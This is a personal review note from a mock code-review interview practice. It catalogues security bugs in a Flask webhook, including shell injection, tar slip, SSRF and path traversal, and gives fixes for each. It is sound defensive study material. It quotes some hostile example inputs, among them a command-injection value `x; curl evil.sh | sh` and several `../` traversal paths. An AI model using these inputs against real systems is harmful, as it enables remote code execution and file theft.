# Sat 24 Oct: Mock code review B (Mercor practice, Flask webhook)

*From my spoken review, tidied. A **Check:** line is a correction. Mercor Code Review Session is today at 10:45.*

## The code
A Flask webhook: it checks a secret header, downloads an archive from a URL in the request, unpacks it into `/srv/jobs`, runs a job script by name, and has a `/status/<path:job>` page that shows job logs.

## Progress
| Mock | Time spoken | Catches | False alarms | Biggest misses |
|---|---|---|---|---|
| #1 (Fri 16) | 4.5 min | 1.5 | 3 | |
| #2 (Tue 20) | 9 min | 1.5 | 4 | SQL injection |
| #3 (Wed 21) | 14 min | 5 | 2 minor | shell injection |
| #4 (Thu 22) | 14 min | 5.5 | 1 | `eval`, `pickle` |
| A (Thu 22) | 13 min | about 5 | 2 | `debug=True`, trusting a header |
| B (Sat 24) | 10 min (plus 5 min reading, not recorded) | about 5.5 | 1 | **`os.system`, `tarfile.extractall`, fetching a client-supplied URL** |

- Better: `debug=True` came **first** (the scan worked), then the hard-coded secret. Two real findings in the first minute.
- Weak: I said "that's it for major security flaws" after three findings, then spent the second pass looking for blank-input checks instead of dangerous calls.

## What I caught
- `debug=True` with `host="0.0.0.0"`: anyone who can reach it can run code. Fix: `debug=False`.
- `WEBHOOK_SECRET` is hard-coded. Fix: an environment variable.
- `tempfile.mktemp()` can be hijacked between getting the name and using it. Fix: `tempfile.mkstemp()` or `NamedTemporaryFile`.
- `verify=False` is wrong.
  - **Check:** the reason matters. It turns off HTTPS certificate checking, so anyone in the middle can read or replace the downloaded archive, and that archive then gets unpacked and run. The "URL could do something bad" point is a different bug (see SSRF below).
- A secret in a header over plain HTTP can be read on the way. Fix: HTTPS only. (A header secret is normal for webhooks, and my reasoning about that was right.)
- A URL chosen by the sender "could do something we don't want" (half catch: this is SSRF, but I attached it to `verify=False` and didn't say what goes wrong or the fix; see #3 below).
- `open("/srv/logs/" + job + ".log")`: use `basename`. Right fix, but say the attack: `job = "../../etc/x"` reads files outside the logs folder.

## What I missed (most serious first)
| # | Problem | What goes wrong | Fix |
|---|---|---|---|
| 1 | `os.system("./jobs/" + name + ".sh " + " ".join(args))` with `name` and `args` from the request | shell injection: a `name` of `x; curl evil.sh \| sh` runs that command. `../` in `name` also runs scripts outside `jobs/` | `subprocess.run([...], check=True, timeout=...)` with a list, no shell, and an allowlist of job names |
| 2 | `t.extractall("/srv/jobs")` on a downloaded archive | "tar slip": member names like `../../etc/cron.d/x` write files anywhere. Together with #1 that is code execution | `t.extractall(path, filter="data")` (Python 3.12+), or check each member's resolved path |
| 3 | **Half caught** ("they could send a URL that does something we don't want"). `requests.get(url)` where `url` comes from the request (SSRF) | the server fetches whatever the sender chooses, including internal-only addresses like `http://localhost:...` or a cloud metadata address | allow only `https` and a list of known hosts, and block private addresses |
| 4 | `args=[]` mutable default, and `payload.get("args")` returns `None` when missing | `None.append(...)` raises `AttributeError`, and the bare `except` hides it. Two bugs feed each other | `args=None`, then `args = list(args or [])` |
| 5 | `except: pass`, then `return ok=True` | any failure, including a crashed job, is reported as success | catch specific errors, log them, return a 500 |
| 6 | `!=` for the secret | the comparison stops at the first different character, so timing can leak the secret one letter at a time | `hmac.compare_digest(a, b)` |
| 7 | `/status/<path:job>` | `path:` allows slashes, so `job` can be `../../var/log/auth`. No login on it either, so anyone can read logs | `<job>` plus a pattern check, `basename`, and require the secret |
| 8 | `requests.get` has no `timeout=`, no `raise_for_status()`, and no size limit | hangs; an error page is saved as the "archive"; a huge download fills the disk | `timeout=10`, `r.raise_for_status()`, stream with a size cap |
| 9 | `JOBS` and `CACHE` are never trimmed | memory grows forever, and the status cache never refreshes | a size limit and an expiry time |
| 10 | `request.get_json()` can return `None`; `payload["archive_url"]` can raise `KeyError` | a 500 with a stack trace | check and return a 400 |
| 11 | The temp file is never deleted | files pile up in `/tmp` | `try`/`finally` with `os.remove` |

## My wrong assumption
- "`run_job` returns nothing, so the `except` won't catch exceptions."
  - **Check:** `except` catches errors **raised** inside `try`, whether or not a function returns anything. A bare `except:` catches *everything* (even Ctrl-C), and `pass` hides it. The problem is the opposite of what I said.

## What to change before the interview
- **I had all three big misses on my red-flag sheet:** `os.system`, `tarfile.extractall`, and `requests.get(user_url)`. Read the sheet once more before 10:45.
- **In the line-by-line pass, ask one question per line: "can the client control any part of this?"** I asked "is it blank?" on every line, which used up time and found nothing. Say "I'd validate all inputs" once, at the end.
- **Don't say "that's it" until the scan is done:** `eval`/`exec`, `os.system`/`shell=True`, `pickle`/`yaml`/`extractall`, SQL strings, user URLs, user paths, `debug=True`, secrets.
- **Use the full time.** The real session is 25 minutes, and I used 10.

## Checklist additions
- Archives: `tarfile` / `zipfile` `extractall` on downloaded files (path traversal)
- A server fetching a URL the client supplied (SSRF)
- Secrets compared with `==` / `!=` (use `hmac.compare_digest`)
- `<path:...>` routes (slashes allowed in the value)
- Bare `except:` (catches everything, including Ctrl-C)
- Temp files never deleted
